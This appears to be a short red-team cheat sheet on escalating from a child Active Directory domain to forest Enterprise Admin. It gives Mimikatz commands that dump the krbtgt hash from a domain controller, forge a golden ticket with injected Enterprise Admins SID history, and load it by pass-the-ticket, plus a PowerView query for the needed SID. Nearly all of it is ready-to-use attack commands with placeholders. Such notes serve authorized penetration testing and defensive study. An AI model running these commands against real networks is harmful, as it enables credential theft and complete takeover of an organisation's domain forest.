# Child to parent - krbtgt hash

### **Get krbtgt hash from dc**

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```



### **Create TGT**

the mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
```



### **Inject the ticket**

```
Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
```



### **Get SID of enterprise admin**

```
Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
```
